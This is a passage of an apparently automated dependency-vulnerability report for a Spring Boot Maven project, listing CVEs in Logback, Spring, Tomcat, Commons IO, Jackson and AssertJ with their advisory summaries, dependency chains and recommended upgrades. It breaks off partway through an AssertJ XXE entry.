    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12 -> ch.qos.logback:logback-core:1.2.12
  - ch.qos.logback:logback-classic:1.2.12; affected range: < 1.2.13
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.2.13 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.
  - ch.qos.logback:logback-classic: upgrade to 1.2.13 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2023-6481: Logback is vulnerable to an attacker mounting a Denial-Of-Service attack by sending poisoned data
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2023-6481](https://github.com/advisories/GHSA-gm62-rw4g-vrc4): Logback is vulnerable to an attacker mounting a Denial-Of-Service attack by sending poisoned data

GHSA: GHSA-gm62-rw4g-vrc4
Severity: HIGH

A serialization vulnerability in logback receiver component part of logback version 1.4.13, 1.3.13 and 1.2.12 allows an attacker to mount a Denial-Of-Service attack by sending poisoned data.


Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - ch.qos.logback:logback-core:1.2.12; affected range: = 1.2.12
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12 -> ch.qos.logback:logback-core:1.2.12

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.2.13 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-22243: Spring Web vulnerable to Open Redirect or Server Side Request Forgery
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-22243](https://github.com/advisories/GHSA-ccgv-vj62-xf9h): Spring Web vulnerable to Open Redirect or Server Side Request Forgery

GHSA: GHSA-ccgv-vj62-xf9h
Severity: HIGH

Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect attack or to a SSRF attack if the URL is used after passing validation checks.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-web:5.3.31; affected range: >= 5.3.0, < 5.3.32
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-web:5.3.31

Recommended fix:
  - org.springframework:spring-web: upgrade to 5.3.32 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-22257: Erroneous authentication pass in Spring Security
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:63

[CVE-2024-22257](https://github.com/advisories/GHSA-f3jh-qvm4-mg39): Erroneous authentication pass in Spring Security

GHSA: GHSA-f3jh-qvm4-mg39
Severity: HIGH

In Spring Security, versions 5.7.x prior to 5.7.12, 5.8.x prior to 5.8.11, versions 6.0.x prior to 6.0.9, versions 6.1.x prior to 6.1.8, versions 6.2.x prior to 6.2.3, an application is possible vulnerable to broken access control when it directly uses the AuthenticatedVoter#vote passing a null Authentication parameter.

Specifically, an application is vulnerable if:

The application uses AuthenticatedVoter directly and a null authentication parameter is passed to it resulting in an erroneous true return value.

An application is not vulnerable if any of the following is true:

* The application does not use AuthenticatedVoter#vote directly.
* The application does not pass null to AuthenticatedVoter#vote.

Note that AuthenticatedVoter is deprecated since 5.8, use implementations of AuthorizationManager as a replacement.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.security:spring-security-core:5.7.11; affected range: < 5.7.12
    - Transitive; pulled by direct root declared at pom.xml:63; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-security:2.7.18 -> org.springframework.security:spring-security-config:5.7.11 -> org.springframework.security:spring-security-core:5.7.11

Recommended fix:
  - org.springframework.security:spring-security-core: upgrade to 5.7.12 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-22259: Spring Framework URL Parsing with Host Validation Vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-22259](https://github.com/advisories/GHSA-hgjh-9rj2-g67j): Spring Framework URL Parsing with Host Validation Vulnerability

GHSA: GHSA-hgjh-9rj2-g67j
Severity: HIGH

Applications that use UriComponentsBuilder in Spring Framework to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.

This is the same as  CVE-2024-22243 https://spring.io/security/cve-2024-22243, but with different input.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-web:5.3.31; affected range: < 5.3.33
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-web:5.3.31

Recommended fix:
  - org.springframework:spring-web: upgrade to 5.3.33 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-22262: Spring Framework URL Parsing with Host Validation
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-22262](https://github.com/advisories/GHSA-2wrp-6fg6-hmc5): Spring Framework URL Parsing with Host Validation

GHSA: GHSA-2wrp-6fg6-hmc5
Severity: HIGH

Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.

This is the same as  CVE-2024-22259 https://spring.io/security/cve-2024-22259  and  CVE-2024-22243 https://spring.io/security/cve-2024-22243 , but with different input.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-web:5.3.31; affected range: < 5.3.34
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-web:5.3.31

Recommended fix:
  - org.springframework:spring-web: upgrade to 5.3.34 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-34750: Apache Tomcat - Denial of Service
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-34750](https://github.com/advisories/GHSA-wm9w-rjj3-j356): Apache Tomcat - Denial of Service

GHSA: GHSA-wm9w-rjj3-j356
Severity: HIGH

Improper Handling of Exceptional Conditions, Uncontrolled Resource Consumption vulnerability in Apache Tomcat. When processing an HTTP/2 stream, Tomcat did not handle some cases of excessive HTTP headers correctly. This led to a miscounting of active HTTP/2 streams which in turn led to the use of an incorrect infinite timeout which allowed connections to remain open which should have been closed. 

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M20, from 10.1.0-M1 through 10.1.24, from 9.0.0-M1 through 9.0.89. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 though 8.5.100.

Users are recommended to upgrade to version 11.0.0-M21, 10.1.25 or 9.0.90, which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0-M1, < 9.0.90
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.90 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-38286: Apache Tomcat Allocation of Resources Without Limits or Throttling vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-38286](https://github.com/advisories/GHSA-7jqf-v358-p8g7): Apache Tomcat Allocation of Resources Without Limits or Throttling vulnerability

GHSA: GHSA-7jqf-v358-p8g7
Severity: HIGH

Allocation of Resources Without Limits or Throttling vulnerability in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M20, from 10.1.0-M1 through 10.1.24, from 9.0.13 through 9.0.89. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.35 through 8.5.100 and 7.0.92 through 7.0.109.

Users are recommended to upgrade to version 11.0.0-M21, 10.1.25, or 9.0.90, which fixes the issue.

Apache Tomcat, under certain configurations on any platform, allows an attacker to cause an OutOfMemoryError by abusing the TLS handshake process.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.13, < 9.0.90
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.90 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-38816: Path traversal vulnerability in functional web frameworks
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-38816](https://github.com/advisories/GHSA-cx7f-g6mp-7hqm): Path traversal vulnerability in functional web frameworks

GHSA: GHSA-cx7f-g6mp-7hqm
Severity: HIGH

Applications serving static resources through the functional web frameworks WebMvc.fn or WebFlux.fn are vulnerable to path traversal attacks. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible to the process in which the Spring application is running.

Specifically, an application is vulnerable when both of the following are true:

  *  the web application uses RouterFunctions to serve static resources
  *  resource handling is explicitly configured with a FileSystemResource location


However, malicious requests are blocked and rejected when any of the following is true:

  *  the  Spring Security HTTP Firewall https://docs.spring.io/spring-security/reference/servlet/exploits/firewall.html  is in use
  *  the application runs on Tomcat or Jetty

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: >= 5.3.0, <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2024-38819: Spring Framework Path Traversal vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-38819](https://github.com/advisories/GHSA-g5vr-rgqm-vf78): Spring Framework Path Traversal vulnerability

GHSA: GHSA-g5vr-rgqm-vf78
Severity: HIGH

Applications serving static resources through the functional web frameworks WebMvc.fn or WebFlux.fn are vulnerable to path traversal attacks. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible to the process in which the Spring application is running.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.40
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2024-47554: Apache Commons IO: Possible denial of service attack on untrusted input to XmlStreamReader
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:69

[CVE-2024-47554](https://github.com/advisories/GHSA-78wr-2p64-hpwj): Apache Commons IO: Possible denial of service attack on untrusted input to XmlStreamReader

GHSA: GHSA-78wr-2p64-hpwj
Severity: HIGH

Uncontrolled Resource Consumption vulnerability in Apache Commons IO.

The `org.apache.commons.io.input.XmlStreamReader` class may excessively consume CPU resources when processing maliciously crafted input.


This issue affects Apache Commons IO: from 2.0 before 2.14.0.

Users are recommended to upgrade to version 2.14.0 or later, which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - commons-io:commons-io:2.11.0; affected range: >= 2.0, < 2.14.0
    - Direct declaration at pom.xml:69; scope: compile; full resolved chain: commons-io:commons-io:2.11.0

Recommended fix:
  - commons-io:commons-io: upgrade to 2.14.0 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-50379: Apache Tomcat Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-50379](https://github.com/advisories/GHSA-5j33-cvvr-w245): Apache Tomcat Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability

GHSA: GHSA-5j33-cvvr-w245
Severity: HIGH

Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability during JSP compilation in Apache Tomcat permits an RCE on case insensitive file systems when the default servlet is enabled for write (non-default configuration).

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.1, from 10.1.0-M1 through 10.1.33, from 9.0.0.M1 through 9.0.97. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.2, 10.1.34 or 9.0.98, which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.98
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.98 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-56337: Apache Tomcat Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-56337](https://github.com/advisories/GHSA-27hp-xhwr-wr2m): Apache Tomcat Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability

GHSA: GHSA-27hp-xhwr-wr2m
Severity: HIGH

Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.1, from 10.1.0-M1 through 10.1.33, from 9.0.0.M1 through 9.0.97.

The mitigation for CVE-2024-50379 was incomplete.

Users running Tomcat on a case insensitive file system with the default servlet write enabled (readonly initialisation 
parameter set to the non-default value of false) may need additional configuration to fully mitigate CVE-2024-50379 depending on which version of Java they are using with Tomcat:
- running on Java 8 or Java 11: the system property sun.io.useCanonCaches must be explicitly set to false (it defaults to true)
- running on Java 17: the system property sun.io.useCanonCaches, if set, must be set to false (it defaults to false)
- running on Java 21 onwards: no further configuration is required (the system property and the problematic cache have been removed)

Tomcat 11.0.3, 10.1.35 and 9.0.99 onwards will include checks that sun.io.useCanonCaches is set appropriately before allowing the default servlet to be write enabled on a case insensitive file system. Tomcat will also set sun.io.useCanonCaches to false by default where it can.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.98
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.98 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-22228: Spring Security Does Not Enforce Password Length
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:63

[CVE-2025-22228](https://github.com/advisories/GHSA-mg83-c7gq-rv5c): Spring Security Does Not Enforce Password Length

GHSA: GHSA-mg83-c7gq-rv5c
Severity: HIGH

BCryptPasswordEncoder.matches(CharSequence,String) will incorrectly return true for passwords larger than 72 characters as long as the first 72 characters are the same.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.security:spring-security-crypto:5.7.11; affected range: <= 5.7.15
    - Transitive; pulled by direct root declared at pom.xml:63; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-security:2.7.18 -> org.springframework.security:spring-security-config:5.7.11 -> org.springframework.security:spring-security-core:5.7.11 -> org.springframework.security:spring-security-crypto:5.7.11

Recommended fix:
  - org.springframework.security:spring-security-crypto: upgrade to 5.7.16 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-22235: Spring Boot EndpointRequest.to() creates wrong matcher if actuator endpoint is not exposed
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:96

[CVE-2025-22235](https://github.com/advisories/GHSA-rc42-6c7j-7h5r): Spring Boot EndpointRequest.to() creates wrong matcher if actuator endpoint is not exposed

GHSA: GHSA-rc42-6c7j-7h5r
Severity: HIGH

EndpointRequest.to() creates a matcher for null/** if the actuator endpoint, for which the EndpointRequest has been created, is disabled or not exposed.

Your application may be affected by this if all the following conditions are met:

  *  You use Spring Security
  *  EndpointRequest.to() has been used in a Spring Security chain configuration
  *  The endpoint which EndpointRequest references is disabled or not exposed via web
  *  Your application handles requests to /null and this path needs protection


You are not affected if any of the following is true:

  *  You don't use Spring Security
  *  You don't use EndpointRequest.to()
  *  The endpoint which EndpointRequest.to() refers to is enabled and is exposed
  *  Your application does not handle requests to /null or this path does not need protection

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.boot:spring-boot:2.7.18; affected range: <= 2.7.24.2
    - Transitive; pulled by direct root declared at pom.xml:96; scope: compile; full resolved chain: org.springframework.boot:spring-boot-devtools:2.7.18 -> org.springframework.boot:spring-boot:2.7.18

Recommended fix:
  - org.springframework.boot:spring-boot: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2025-41249: Spring Framework annotation detection mechanism may result in improper authorization
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:82

[CVE-2025-41249](https://github.com/advisories/GHSA-jmp9-x22r-554x): Spring Framework annotation detection mechanism may result in improper authorization

GHSA: GHSA-jmp9-x22r-554x
Severity: HIGH

The Spring Framework annotation detection mechanism may not correctly resolve annotations on methods within type hierarchies with a parameterized super type with unbounded generics. This can be an issue if such annotations are used for authorization decisions.

Your application may be affected by this if you are using Spring Security's @EnableMethodSecurity feature.

You are not affected by this if you are not using @EnableMethodSecurity or if you do not use security annotations on methods in generic superclasses or generic interfaces.

This CVE is published in conjunction with  CVE-2025-41248 https://spring.io/security/cve-2025-41248 .

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-core:5.3.31; affected range: >= 5.3.0, <= 5.3.44
    - Transitive; pulled by direct root declared at pom.xml:82; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-test:2.7.18 -> org.springframework:spring-core:5.3.31

Recommended fix:
  - org.springframework:spring-core: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2025-48988: Apache Tomcat - DoS in multipart upload
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-48988](https://github.com/advisories/GHSA-h3gc-qfqq-6h8f): Apache Tomcat - DoS in multipart upload

GHSA: GHSA-h3gc-qfqq-6h8f
Severity: HIGH

Allocation of Resources Without Limits or Throttling vulnerability in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, <= 9.0.105
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.106 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-48989: Apache Tomcat Improper Resource Shutdown or Release vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-48989](https://github.com/advisories/GHSA-gqp3-2cvr-x8m3): Apache Tomcat Improper Resource Shutdown or Release vulnerability

GHSA: GHSA-gqp3-2cvr-x8m3
Severity: HIGH

Improper Resource Shutdown or Release vulnerability in Apache Tomcat made Tomcat vulnerable to the made you reset attack.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.9, from 10.1.0-M1 through 10.1.43 and from 9.0.0.M1 through 9.0.107. Older, EOL versions may also be affected.

Users are recommended to upgrade to one of versions 11.0.10, 10.1.44 or 9.0.108 which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.108
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.108 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-52520: Apache Tomcat Catalina is vulnerable to DoS attack through bypassing of size limits
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-52520](https://github.com/advisories/GHSA-wr62-c79q-cv37): Apache Tomcat Catalina is vulnerable to DoS attack through bypassing of size limits

GHSA: GHSA-wr62-c79q-cv37
Severity: HIGH

For some unlikely configurations of multipart upload, an Integer Overflow vulnerability in Apache Tomcat could lead to a DoS via bypassing of size limits.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.8, from 10.1.0-M1 through 10.1.42, from 9.0.0.M1 through 9.0.106. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.9, 10.1.43 or 9.0.107, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.107
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.107 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-52999: jackson-core can throw a StackoverflowError when processing deeply nested data
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2025-52999](https://github.com/advisories/GHSA-h46c-h94j-95f3): jackson-core can throw a StackoverflowError when processing deeply nested data

GHSA: GHSA-h46c-h94j-95f3
Severity: HIGH

### Impact
With older versions  of jackson-core, if you parse an input file and it has deeply nested data, Jackson could end up throwing a StackoverflowError if the depth is particularly large.

### Patches
jackson-core 2.15.0 contains a configurable limit for how deep Jackson will traverse in an input document, defaulting to an allowable depth of 1000. Change is in https://github.com/FasterXML/jackson-core/pull/943. jackson-core will throw a StreamConstraintsException if the limit is reached.
jackson-databind also benefits from this change because it uses jackson-core to parse JSON inputs.

### Workarounds
Users should avoid parsing input files from untrusted sources.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-core:2.13.5; affected range: < 2.15.0
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5 -> com.fasterxml.jackson.core:jackson-core:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-core: upgrade to 2.15.0 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-53506: Apache Tomcat Coyote vulnerable to Denial of Service via excessive HTTP/2 streams
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-53506](https://github.com/advisories/GHSA-25xr-qj8w-c4vf): Apache Tomcat Coyote vulnerable to Denial of Service via excessive HTTP/2 streams

GHSA: GHSA-25xr-qj8w-c4vf
Severity: HIGH

Uncontrolled Resource Consumption vulnerability in Apache Tomcat if an HTTP/2 client did not acknowledge the initial settings frame that reduces the maximum permitted concurrent streams.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.8, from 10.1.0-M1 through 10.1.42, from 9.0.0.M1 through 9.0.106. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100.

Users are recommended to upgrade to version 11.0.9, 10.1.43 or 9.0.107, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.107
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.107 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-55752: Apache Tomcat Vulnerable to Relative Path Traversal
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-55752](https://github.com/advisories/GHSA-wmwf-9ccg-fff5): Apache Tomcat Vulnerable to Relative Path Traversal

GHSA: GHSA-wmwf-9ccg-fff5
Severity: HIGH

The fix for bug 60013 introduced a regression where the rewritten URL was normalized before it was decoded. This introduced the possibility that, for rewrite rules that rewrite query parameters to the URL, an attacker could manipulate the request URI to bypass security constraints including the protection for /WEB-INF/ and /META-INF/. If PUT requests were also enabled then malicious files could be uploaded leading to remote code execution. PUT requests are normally limited to trusted users and it is considered unlikely that PUT requests would be enabled in conjunction with a rewrite that manipulated the URI.



This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.10, from 10.1.0-M1 through 10.1.44, from 9.0.0.M11 through 9.0.108.

The following versions were EOL at the time the CVE was created but are  known to be affected: 8.5.6 though 8.5.100. Other, older, EOL versions may also be affected. Users are recommended to upgrade to version 11.0.11 or later, 10.1.45 or later or 9.0.109 or later, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0-M11, < 9.0.109
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.109 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-24400: AssertJ has XML External Entity (XXE) vulnerability when parsing untrusted XML via isXmlEqualTo assertion
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:82

[CVE-2026-24400](https://github.com/advisories/GHSA-rqfh-9r24-8c9r): AssertJ has XML External Entity (XXE) vulnerability when parsing untrusted XML via isXmlEqualTo assertion

GHSA: GHSA-rqfh-9r24-8c9r
Severity: HIGH

An XML External Entity (XXE) vulnerability exists in `org.assertj.core.util.xml.XmlStringPrettyFormatter`: the `toXmlDocument(String)` method initializes `DocumentBuilderFactory` with default settings, without disabling DTDs or external entities. This formatter is used by the `isXmlEqualTo(CharSequence)` assertion for `CharSequence` values.

An application is vulnerable only when it uses untrusted XML input with one of the following methods:

- `isXmlEqualTo(CharSequence)` from `org.assertj.core.api.AbstractCharSequenceAssert`
- `xmlPrettyFormat(String)` from `org.assertj.core.util.xml.XmlStringPrettyFormatter`

### Impact

If untrusted XML input is processed by the methods mentioned above (e.g., in test environments handling external fixture files), an attacker could:

